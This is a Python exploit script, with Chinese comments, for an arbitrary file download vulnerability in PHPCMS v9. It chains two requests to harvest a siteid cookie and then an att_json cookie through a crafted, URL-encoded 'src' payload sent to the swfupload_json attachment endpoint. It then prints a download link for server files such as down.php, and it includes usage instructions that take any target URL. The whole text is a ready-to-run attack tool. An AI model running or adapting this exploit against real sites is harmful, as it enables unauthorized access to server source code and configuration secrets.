import requests
import re
import sys

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64)"}

def get_cookie1(host):
    url_1 = host + "/index.php?m=wap&c=index&a=init&siteid=1"
    print("[*] 请稍等...正在获取Cookie:")
    reponse = requests.get(url_1,headers=headers)

    
    try:
        pattern = r".*siteid"  #phpcmsv9 siteid字段格式为：xxxx_siteid,使用该正则匹配
        for item in reponse.cookies.keys():
            res = re.findall(pattern,item)

            if res:
                cookie1 = reponse.cookies.get(res[0])
                print("[+] 获取到Cookie1:")
                print("[+] " + res[0] + ":" + cookie1)
                return cookie1

    except:
        print("[-] 获取Cookie1失败!")

def get_cookie2(host,cookie1):
    #该payload实现下载phpcms/modules/content/down.php文件 
    payload = "src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dphpcms%2fmodules%2fcontent%2fdown.ph%26f=p%3%252%2*77C"
    
    #payload = "src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26f%3D%2Ep%25253chp%26s%3Dindex%26pade%3D"
    #payload = "src%3Dpad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D%2Ep%25253chp%26pade%3D"

    url_2 = host + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&" + payload
        
    data = {"userid_flash":cookie1}  #将第一次得到的cookie作为"userid_flash"的值，并以POST方式提交
    reponse = requests.post(url_2,data=data,headers=headers)

    try:
        pattern = r".*att_json" #phpcmsv9 att_json字段格式为：xxxx_att_json,使用该正则匹配
        for item in reponse.cookies.keys():
            res = re.findall(pattern,item)
            if res:
                cookie2 = reponse.cookies.get(res[0])
                print("[+] 获取到Cookie2:")
                print("[+] " + res[0] + ":" + cookie2)
                return cookie2

    except:
        print("[-] 获取Cookie2失败!")

def help():
    print("-------------------------------------------------------------------------")
    print(" [*] 使用说明：给出index.php之前的部分")
    print("       Usage: python3 phpcmsv9.py http://host:port")
    print("     Example：python3 phpcmsv9.py http://localhost/phpcms")
    print("-------------------------------------------------------------------------")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        help()
        sys.exit(0)

    host = sys.argv[1].strip()
    cookie1 = get_cookie1(host)
    cookie2 = get_cookie2(host,cookie1)

    if cookie2:
        print("[+] Open link to download file: ")
        print("[+] " + host + "/index.php?m=content&c=down&a=init&a_k=" + cookie2) #最终文件下载连接